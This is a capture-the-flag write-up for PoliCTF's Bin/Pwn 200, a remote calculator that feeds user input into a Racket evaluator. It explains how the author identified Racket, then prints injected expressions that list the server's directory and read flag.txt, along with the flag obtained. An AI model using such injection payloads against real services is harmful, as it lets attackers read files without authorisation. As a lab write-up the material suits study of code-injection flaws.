<h1>PoliCTF Bin/Pwn 200</h1>

<p>Bin 200 exposes a calculator application running on some port.</p>

<pre><code>mah@mah-MacBookAir ~ % nc -p 9003 calc.challenges.polictf.it 4000
Write the first number:5
Write the operator:*
Write the second number:5
25
</code></pre>

<p>The calculator concatenates [Operator Text] [First Number Text] [Second Number
Text] and runs a polish notation calculation on the text. The polish
notation calculation is actually a racket evaluator. I imagine source
logic sort of like:</p>

<pre><code>echo "( $OPERATOR_TEXT $FIRST_NUMBER_TEXT $SECOND_NUMBER_TEXT )" | racket
</code></pre>

<p>Racket was determined by a few things. First consider Polish notation
languages. The calculator handled fraction math and responded to scheme
boolean functions with #t and #f. Racket from Scheme was distinguished
creating an if statement with no else.</p>

<pre><code>Write the first number:if #t 1
Write the operator:
Write the second number:
</code></pre>

<p>This stalls and fails, so it is racket.</p>

<p>We can then find and expose the flag</p>

<pre><code>Write the first number:foldr (lambda (x y) (string-append x " " y)) "" (map (lambda (x) (path-&gt;string x)) (directory-list (current-directory)))
Write the operator:
Write the second number:
flag.txt challenge

Write the first number:read-line (open-input-file "flag.txt")
Write the operator:
Write the second number:
cb1228e2387cc12ad30fd4243fc23a0
</code></pre>

<p>Interestingly, functions file->string and system don't work.</p>
